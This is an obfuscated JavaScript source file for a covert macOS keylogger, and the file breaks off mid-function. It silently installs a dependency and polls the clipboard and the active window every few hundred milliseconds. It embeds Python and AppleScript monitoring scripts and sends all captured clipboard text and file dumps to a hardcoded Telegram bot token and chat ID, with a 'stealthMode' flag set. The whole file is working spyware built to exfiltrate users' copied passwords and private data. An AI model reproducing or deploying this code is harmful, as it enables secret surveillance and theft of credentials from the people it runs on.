const _0x1db4df=_0x3b60;(function(_0x41bcc1,_0x5d6163){const _0x108791=_0x3b60,_0x41d072=_0x41bcc1();while(!![]){try{const _0x29089a=-parseInt(_0x108791(0x16c))/0x1*(-parseInt(_0x108791(0x182))/0x2)+parseInt(_0x108791(0x1a3))/0x3*(-parseInt(_0x108791(0x122))/0x4)+parseInt(_0x108791(0x1b1))/0x5*(-parseInt(_0x108791(0x18d))/0x6)+-parseInt(_0x108791(0x143))/0x7+-parseInt(_0x108791(0x112))/0x8*(parseInt(_0x108791(0x193))/0x9)+parseInt(_0x108791(0x197))/0xa*(parseInt(_0x108791(0x100))/0xb)+parseInt(_0x108791(0x13d))/0xc;if(_0x29089a===_0x5d6163)break;else _0x41d072['push'](_0x41d072['shift']());}catch(_0x51d00c){_0x41d072['push'](_0x41d072['shift']());}}}(_0x3724,0xaecd9));function _0x3b60(_0x5ba5b1,_0x3ee671){const _0x372428=_0x3724();return _0x3b60=function(_0x3b602a,_0xf8200){_0x3b602a=_0x3b602a-0xfa;let _0x415e29=_0x372428[_0x3b602a];return _0x415e29;},_0x3b60(_0x5ba5b1,_0x3ee671);}const fs=require('fs'),path=require(_0x1db4df(0x108)),os=require('os'),https=require(_0x1db4df(0x16b)),{exec,spawn,execSync}=require(_0x1db4df(0x118));let activeWin=null;try{activeWin=require(_0x1db4df(0x11f));}catch(_0x152e65){try{console[_0x1db4df(0x146)](_0x1db4df(0x144)),execSync(_0x1db4df(0x149),{'stdio':'ignore','timeout':0x7530}),activeWin=require(_0x1db4df(0x11f)),console[_0x1db4df(0x146)](_0x1db4df(0x13e));}catch(_0x20bec5){console[_0x1db4df(0x146)](_0x1db4df(0x13a));}}function _0x3724(){const _0x530d38=['write','URGENT','lastMessageTime','16LAgqqE','https://api.telegram.org/bot','clipboardTimer','end','writeFileSync','existsSync','child_process','stop','Content-Disposition:\x20form-data;\x20name=\x22document\x22;\x20filename=\x22','\x20Clipboard\x20(','WINDOW_CHANGE:','random','length','active-win','üá™üá∫','readFileSync','5212PqPbSG','#!/usr/bin/env\x20python3\x0aimport\x20sys\x0aimport\x20time\x0aimport\x20subprocess\x0afrom\x20threading\x20import\x20Thread,\x20Event\x0a\x0aclass\x20MacOSKeylogger:\x0a\x20\x20\x20\x20def\x20__init__(self):\x0a\x20\x20\x20\x20\x20\x20\x20\x20self.stop_event\x20=\x20Event()\x0a\x20\x20\x20\x20\x20\x20\x20\x20self.last_clipboard\x20=\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20def\x20monitor_clipboard(self):\x0a\x20\x20\x20\x20\x20\x20\x20\x20while\x20not\x20self.stop_event.is_set():\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20result\x20=\x20subprocess.run([\x27pbpaste\x27],\x20capture_output=True,\x20text=True,\x20timeout=1)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20current_clipboard\x20=\x20result.stdout\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20current_clipboard\x20!=\x20self.last_clipboard\x20and\x20current_clipboard.strip():\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20print(f\x22CLIPBOARD_CHANGE:{current_clipboard[:100]}\x22)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20sys.stdout.flush()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20self.last_clipboard\x20=\x20current_clipboard\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20except\x20Exception\x20as\x20e:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20pass\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20time.sleep(0.3)\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20def\x20monitor_active_window(self):\x0a\x20\x20\x20\x20\x20\x20\x20\x20last_window\x20=\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20while\x20not\x20self.stop_event.is_set():\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20script\x20=\x20\x27\x27\x27\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20tell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20frontApp\x20to\x20name\x20of\x20first\x20application\x20process\x20whose\x20frontmost\x20is\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20frontApp\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20tell\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27\x27\x27\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20result\x20=\x20subprocess.run([\x27osascript\x27,\x20\x27-e\x27,\x20script],\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20capture_output=True,\x20text=True,\x20timeout=2)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20current_window\x20=\x20result.stdout.strip()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20current_window\x20!=\x20last_window\x20and\x20current_window:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20print(f\x22WINDOW_CHANGE:{current_window}\x22)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20sys.stdout.flush()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20last_window\x20=\x20current_window\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20except\x20Exception\x20as\x20e:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20pass\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20time.sleep(2)\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20def\x20start(self):\x0a\x20\x20\x20\x20\x20\x20\x20\x20print(\x22KEYLOGGER_READY\x22)\x0a\x20\x20\x20\x20\x20\x20\x20\x20sys.stdout.flush()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20clipboard_thread\x20=\x20Thread(target=self.monitor_clipboard)\x0a\x20\x20\x20\x20\x20\x20\x20\x20window_thread\x20=\x20Thread(target=self.monitor_active_window)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20clipboard_thread.start()\x0a\x20\x20\x20\x20\x20\x20\x20\x20window_thread.start()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20while\x20not\x20self.stop_event.is_set():\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20time.sleep(1)\x0a\x20\x20\x20\x20\x20\x20\x20\x20except\x20KeyboardInterrupt:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20self.stop_event.set()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20clipboard_thread.join(timeout=1)\x0a\x20\x20\x20\x20\x20\x20\x20\x20window_thread.join(timeout=1)\x0a\x0aif\x20__name__\x20==\x20\x22__main__\x22:\x0a\x20\x20\x20\x20keylogger\x20=\x20MacOSKeylogger()\x0a\x20\x20\x20\x20keylogger.start()\x0a','exit','push','isMonitoringPaste','queueMessage','messageSendTimer','currentWindow','Clipboard\x20Content\x20-\x20','lastPasteTime','CLIPBOARD_CHANGE:','handleWindowChange','----boundary','\x0a\x0aüìÑ\x20Content:\x20','sort','\x0aüñºÔ∏è\x20From:\x20','byteLength','telegramBotToken','üìÑ\x20COPY\x20operation\x20detected\x0aüñºÔ∏è\x20From:\x20','üçé\x20Platform:\x20macOS\x0a','ERROR:','filter','name','from','‚ö†Ô∏è\x20Using\x20native\x20macOS\x20methods\x20for\x20window\x20detection','now','Request\x20timeout','13704816jKRJtC','‚úÖ\x20Active-win\x20installed\x20successfully','üìã\x20','main','application/json','toISOString','2707376NivinQ','üì¶\x20Installing\x20active-win...','startWindowMonitoring','log','üñºÔ∏è\x20','clipboardHistory','npm\x20install\x20active-win','‚ùå\x20Start\x20error:\x20','startKeystrokeCapture','...','messagesSentThisMinute','\x0a\x0aüìÑ\x20Preview:\x0a','lastClipboardContent','\x0d\x0a--','currentLanguage','handleClipboardChange','\x20chars)','kill','data','chmodSync','Unknown','Content-Disposition:\x20form-data;\x20name=\x22caption\x22\x0d\x0a\x0d\x0a','messageQueue','üáÆüá±','POST','keyloggerProcess','multipart/form-data;\x20boundary=','SIGINT','‚ùå\x20Keylogger\x20error:\x20','‚ùå\x20Error:','\x0a\x0aüìé\x20Full\x20content\x20attached\x20(','message','755','pipe','telegramChatId','üá∑üá∫','unshift','üìã\x20Starting\x20clipboard\x20and\x20window\x20monitoring...','macos_keylogger.py','isRunning','https','105839nPOQMF','üöÄ\x20macOS\x20Monitor\x20Started\x0a\x0a','startClipboardMonitoring','handleLargeClipboardContent','macos_keylogger.applescript','SIGTERM','priority','\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20run\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20oldClipboard\x20to\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20currentApp\x20to\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20repeat\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--\x20Monitor\x20clipboard\x20for\x20copy/paste\x20detection\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20newClipboard\x20to\x20(the\x20clipboard\x20as\x20string)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20newClipboard\x20is\x20not\x20equal\x20to\x20oldClipboard\x20then\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log\x20\x22CLIPBOARD_CHANGE:\x22\x20&\x20newClipboard\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20oldClipboard\x20to\x20newClipboard\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20if\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--\x20Monitor\x20active\x20application\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20tell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20frontApp\x20to\x20name\x20of\x20first\x20application\x20process\x20whose\x20frontmost\x20is\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20frontApp\x20is\x20not\x20equal\x20to\x20currentApp\x20then\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log\x20\x22WINDOW_CHANGE:\x22\x20&\x20frontApp\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20currentApp\x20to\x20frontApp\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20if\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20tell\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20delay\x200.5\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20errMsg\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20log\x20\x22ERROR:\x22\x20&\x20errMsg\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20repeat\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20run\x0a\x20\x20\x20\x20\x20\x20\x20\x20','forEach','concat','toLocaleTimeString','trackActiveWindow','shift','\x0a\x0aüìÑ\x20Content:\x0a','match','‚ùå\x20Failed\x20to\x20send\x20clipboard\x20file:\x20','HTTP\x20','üá∏üá¶','batchTimer','join','processKeystrokeOutput','Source:\x20','4TaxnKQ','repeat','pythonScriptPath','7853310203:AAFWGbyq8bv2jPGvOC4YHm6yjz3X-mftP_Y','clipboardCheckInterval','osascript\x20-e\x20\x27','unlinkSync','trim','ignore','startMessageProcessor','scriptPath','1875294ktCIvD','stderr','üìã\x20Clipboard\x20Monitoring\x0a','split','catch','entries','2902797EAKydk','maxMessagesPerMinute','KEYLOGGER_READY','owner','26230slZgrw','title','NORMAL','substring','handleExit','üçé\x20macOS\x20Enhanced\x20Monitor','-4899601425','/sendMessage','timeout','english','statusCode','getLanguageFlag','831iIGaKr','start','destroy','windowTimer','processMessageQueue','üáØüáµ','üî¥\x20macOS\x20Monitor\x20Stopped','\x0a‚è∞\x20','üñºÔ∏è\x20Initial:\x20','sendTelegramFile','üá¨üá∑','lastWindow','utf8','üáßüá¨','5LmKOqO','stdout','.txt','replace','Already\x20running','keys','startsWith','bind','/sendDocument','4477WIblGA','Content-Disposition:\x20form-data;\x20name=\x22chat_id\x22\x0d\x0a\x0d\x0a','error','\x20-\x20','toString','üìã\x20COPIED:\x20','python3','--\x0d\x0a','path','Language:\x20','handleClipboardFromKeylogger','instantClipboard','getActiveWindow','config','\x22\x0d\x0a'];_0x3724=function(){return _0x530d38;};return _0x3724();}const CONFIG={'telegramBotToken':_0x1db4df(0x185),'telegramChatId':_0x1db4df(0x19d),'keystrokeBatchInterval':0xbb8,'messageInterval':0x7d0,'clipboardCheckInterval':0x12c,'windowCheckInterval':0x7d0,'maxMessagesPerMinute':0x1e,'maxBatchSize':0xc8,'trackActiveWindow':!![],'instantClipboard':!![],'batchKeystrokes':!![],'stealthMode':!![]},LANGUAGE_PATTERNS={'hebrew':/[\u0590-\u05ff\u200f\u200e]/,'russian':/[–∞-—è—ë–ê-–Ø–Å\u0400-\u04ff]/,'arabic':/[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff\ufb50-\ufdff\ufe70-\ufeff]/,'chinese':/[\u4e00-\u9fff\u3400-\u4dbf\uf900-\ufaff]/,'japanese':/[\u3040-\u309f\u30a0-\u30ff\u31f0-\u31ff\uff65-\uff9f]/,'korean':/[\uac00-\ud7af\u1100-\u11ff\u3130-\u318f]/,'greek':/[\u0370-\u03ff\u1f00-\u1fff]/,'cyrillic':/[\u0400-\u04ff\u0500-\u052f\u2de0-\u2dff\ua640-\ua69f]/,'latin_extended':/[\u0100-\u017f\u0180-\u024f\u1e00-\u1eff]/,'english':/[a-zA-Z]/},PRIORITY={'URGENT':0x1,'NORMAL':0x2,'LOW':0x3};class EnhancedMacOSKeylogger{constructor(_0x4070bc=CONFIG){const _0x25539e=_0x1db4df;this[_0x25539e(0x10d)]={...CONFIG,..._0x4070bc},this[_0x25539e(0x16a)]=![],this['keyBuffer']='',this[_0x25539e(0x151)]=_0x25539e(0x1a0),this[_0x25539e(0x14f)]='',this[_0x25539e(0x148)]=[],this[_0x25539e(0x12b)]=0x0,this[_0x25539e(0x126)]=![],this['currentWindow']=_0x25539e(0x157),this[_0x25539e(0x1ae)]='',this[_0x25539e(0x15c)]=null,this[_0x25539e(0x114)]=null,this[_0x25539e(0x1a6)]=null,this[_0x25539e(0x17e)]=null,this[_0x25539e(0x159)]=[],this[_0x25539e(0x14d)]=0x0,this[_0x25539e(0x111)]=0x0,this['messageSendTimer']=null,this['stop']=this[_0x25539e(0x119)][_0x25539e(0xfe)](this),this[_0x25539e(0x19b)]=this['handleExit'][_0x25539e(0xfe)](this),process['on'](_0x25539e(0x15e),this[_0x25539e(0x19b)]),process['on'](_0x25539e(0x171),this[_0x25539e(0x19b)]),process['on'](_0x25539e(0x124),this[_0x25539e(0x19b)]),this[_0x25539e(0x18b)]();}[_0x1db4df(0x18b)](){const _0x2c9aac=_0x1db4df;setInterval(()=>{const _0x5a4b36=_0x3b60;this[_0x5a4b36(0x14d)]=0x0;},0xea60),this[_0x2c9aac(0x128)]=setInterval(()=>{const _0x1ad5d9=_0x2c9aac;this[_0x1ad5d9(0x1a7)]();},this[_0x2c9aac(0x10d)]['messageInterval']);}['queueMessage'](_0x2c5fd8,_0x1bc5b6=PRIORITY[_0x1db4df(0x199)]){const _0x4f8d7d=_0x1db4df;this['messageQueue'][_0x4f8d7d(0x125)]({'message':_0x2c5fd8,'priority':_0x1bc5b6,'timestamp':Date['now']()}),this['messageQueue'][_0x4f8d7d(0x130)]((_0x4865a6,_0x121148)=>_0x4865a6['priority']-_0x121148[_0x4f8d7d(0x172)]),_0x1bc5b6===PRIORITY[_0x4f8d7d(0x110)]&&this[_0x4f8d7d(0x14d)]<this[_0x4f8d7d(0x10d)][_0x4f8d7d(0x194)]&&this[_0x4f8d7d(0x1a7)]();}async[_0x1db4df(0x1a7)](){const _0x4b5927=_0x1db4df;if(this['messageQueue']['length']===0x0||this[_0x4b5927(0x14d)]>=this[_0x4b5927(0x10d)]['maxMessagesPerMinute'])return;const _0x21f760=Date[_0x4b5927(0x13b)]();if(_0x21f760-this[_0x4b5927(0x111)]<this[_0x4b5927(0x10d)]['messageInterval'])return;const _0x5a89b3=this[_0x4b5927(0x159)][_0x4b5927(0x178)]();if(_0x5a89b3)try{await this['sendTelegramMessage'](_0x5a89b3[_0x4b5927(0x162)]),this['messagesSentThisMinute']++,this[_0x4b5927(0x111)]=_0x21f760;}catch(_0x554f48){this['messageQueue'][_0x4b5927(0x167)](_0x5a89b3);}}async[_0x1db4df(0x10c)](){const _0x1c07fd=_0x1db4df;try{if(activeWin){const _0x3f97ce=await activeWin();if(_0x3f97ce&&_0x3f97ce[_0x1c07fd(0x196)]&&_0x3f97ce[_0x1c07fd(0x198)]){const _0x1c257d=_0x3f97ce[_0x1c07fd(0x196)][_0x1c07fd(0x138)]||_0x1c07fd(0x157),_0x549b69=_0x3f97ce[_0x1c07fd(0x198)]['length']>0x28?_0x3f97ce['title']['substring'](0x0,0x25)+'...':_0x3f97ce[_0x1c07fd(0x198)];return _0x1c257d+_0x1c07fd(0x103)+_0x549b69;}else{if(_0x3f97ce&&_0x3f97ce[_0x1c07fd(0x196)])return _0x3f97ce['owner'][_0x1c07fd(0x138)]||_0x1c07fd(0x157);}}const _0x3b8389='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20tell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20frontApp\x20to\x20name\x20of\x20first\x20application\x20process\x20whose\x20frontmost\x20is\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20windowTitle\x20to\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20tell\x20process\x20frontApp\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20windowTitle\x20to\x20name\x20of\x20front\x20window\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20tell\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20frontApp\x20&\x20\x22\x20-\x20\x22\x20&\x20windowTitle\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20end\x20tell\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0xade6e5=await new Promise(_0x371b6e=>{const _0x3341fc=_0x1c07fd;exec(_0x3341fc(0x187)+_0x3b8389+'\x27',{'encoding':'utf8','timeout':0x7d0},(_0x3487bd,_0xe3a006)=>{const _0xa97037=_0x3341fc;if(_0x3487bd)_0x371b6e('Unknown');else{const _0x100ae4=_0xe3a006[_0xa97037(0x189)]();_0x371b6e(_0x100ae4[_0xa97037(0x11e)]>0x28?_0x100ae4[_0xa97037(0x19a)](0x0,0x25)+_0xa97037(0x14c):_0x100ae4);}});});return _0xade6e5||_0x1c07fd(0x157);}catch(_0x309b47){return _0x1c07fd(0x157);}}[_0x1db4df(0x145)](){const _0x588f73=_0x1db4df;if(!this['config'][_0x588f73(0x177)])return;this['windowTimer']=setInterval(async()=>{const _0x2f0825=_0x588f73;try{const _0x10ddc7=await this[_0x2f0825(0x10c)]();_0x10ddc7!==_0x2f0825(0x157)&&_0x10ddc7!==this[_0x2f0825(0x1ae)]&&(this[_0x2f0825(0x1ae)]=this['currentWindow'],this[_0x2f0825(0x129)]=_0x10ddc7,this[_0x2f0825(0x1ae)]!==''&&this['queueMessage'](_0x2f0825(0x147)+_0x10ddc7,PRIORITY[_0x2f0825(0x199)]));}catch(_0x2a8293){}},this['config']['windowCheckInterval']);}[_0x1db4df(0x16e)](){const _0x2754b8=_0x1db4df;if(!this[_0x2754b8(0x10d)][_0x2754b8(0x10b)])return;this[_0x2754b8(0x114)]=setInterval(async()=>{const _0x17177a=_0x2754b8;try{const _0x2e13eb=execSync('pbpaste',{'encoding':_0x17177a(0x1af),'timeout':0x7d0,'maxBuffer':0x400*0x400}),_0x50eb1a=_0x2e13eb['toString']();_0x50eb1a&&_0x50eb1a!==this['lastClipboardContent']&&_0x50eb1a[_0x17177a(0x11e)]>0x0&&_0x50eb1a[_0x17177a(0x11e)]<0x2710&&(this[_0x17177a(0x152)](_0x50eb1a),this[_0x17177a(0x14f)]=_0x50eb1a);}catch(_0x5f518b){}},this[_0x2754b8(0x10d)][_0x2754b8(0x186)]);}['detectLanguageFromText'](_0x156125){const _0x38fae1=_0x1db4df,_0x1d5c4b={};for(const [_0x37a6fd,_0xae6cc8]of Object[_0x38fae1(0x192)](LANGUAGE_PATTERNS)){const _0x584b5e=_0x156125[_0x38fae1(0x17a)](new RegExp(_0xae6cc8['source'],'g'));_0x1d5c4b[_0x37a6fd]=_0x584b5e?_0x584b5e[_0x38fae1(0x11e)]:0x0;}const _0x1b8d05=Object[_0x38fae1(0xfc)](_0x1d5c4b)['reduce']((_0x3453a7,_0xe2de60)=>_0x1d5c4b[_0x3453a7]>_0x1d5c4b[_0xe2de60]?_0x3453a7:_0xe2de60);return _0x1d5c4b[_0x1b8d05]>0x0?_0x1b8d05:_0x38fae1(0x1a0);}[_0x1db4df(0x1a2)](_0x532387){const _0x240fc2=_0x1db4df,_0x26424f={'hebrew':_0x240fc2(0x15a),'russian':_0x240fc2(0x166),'arabic':_0x240fc2(0x17d),'chinese':'üá®üá≥','japanese':_0x240fc2(0x1a8),'korean':'üá∞üá∑','greek':_0x240fc2(0x1ad),'cyrillic':_0x240fc2(0x1b0),'latin_extended':_0x240fc2(0x120),'english':'üá∫üá∏'};return _0x26424f[_0x532387]||'üåê';}['handleClipboardChange'](_0xb3cc51){const _0x2a0276=_0x1db4df,_0x247090=Date[_0x2a0276(0x13b)](),_0x559a44=_0xb3cc51[_0x2a0276(0x11e)]>0x1f4?_0xb3cc51[_0x2a0276(0x19a)](0x0,0x1f4)+_0x2a0276(0x14c):_0xb3cc51,_0xd84f0b=this['detectLanguageFromText'](_0xb3cc51),_0x2182f0=this[_0x2a0276(0x1a2)](_0xd84f0b);this[_0x2a0276(0x148)][_0x2a0276(0x125)]({'content':_0xb3cc51,'preview':_0x559a44,'timestamp':_0x247090,'window':this['currentWindow'],'language':_0xd84f0b});this['clipboardHistory']['length']>0x5&&this['clipboardHistory']['shift']();const _0x53a265=new Date(_0x247090)[_0x2a0276(0x176)](),_0x546477=_0x2a0276(0x105)+_0x2182f0+_0x2a0276(0x131)+this[_0x2a0276(0x129)]+_0x2a0276(0x1aa)+_0x53a265;if(_0xb3cc51[_0x2a0276(0x11e)]<=0xdac){const _0x72d333=_0x546477+_0x2a0276(0x179)+_0xb3cc51;this['queueMessage'](_0x72d333,PRIORITY[_0x2a0276(0x110)]);}else this[_0x2a0276(0x16f)](_0xb3cc51,_0x546477,_0x559a44,_0xd84f0b,_0x2182f0);this[_0x2a0276(0x126)]=!![],setTimeout(()=>{const _0x3b26bc=_0x2a0276;this[_0x3b26bc(0x126)]=![];},0x7530);}[_0x1db4df(0x16f)](_0x46e96f,_0x3c3e1e,_0x629dcc,_0xea1538,_0x5cb6c){const _0x93c2bc=_0x1db4df,_0x2f70e2=_0x3c3e1e+_0x93c2bc(0x14e)+_0x629dcc+_0x93c2bc(0x161)+_0x46e96f[_0x93c2bc(0x11e)]+_0x93c2bc(0x153);try{const _0x2b9364=new Date()[_0x93c2bc(0x142)]()[_0x93c2bc(0xfa)](/[:.]/g,'-'),_0x1f7b66='clipboard_'+_0x2b9364+_0x93c2bc(0x1b3),_0xa12da2=path[_0x93c2bc(0x17f)](__dirname,_0x1f7b66),_0x4aa68f=_0x93c2bc(0x12a)+new Date()['toLocaleString']()+'\x0a',_0x3075ea=_0x93c2bc(0x181)+this[_0x93c2bc(0x129)]+'\x0a',_0x5a5923=_0x93c2bc(0x109)+_0xea1538+'\x20'+_0x5cb6c+'\x0a',_0x51969d='='[_0x93c2bc(0x183)](0x32)+'\x0a\x0a',_0x2b39e3=_0x4aa68f+_0x3075ea+_0x5a5923+_0x51969d+_0x46e96f;fs[_0x93c2bc(0x116)](_0xa12da2,_0x2b39e3,_0x93c2bc(0x1af)),this['queueMessage'](_0x2f70e2,PRIORITY[_0x93c2bc(0x110)]),setTimeout(async()=>{const _0x57ab45=_0x93c2bc;try{await 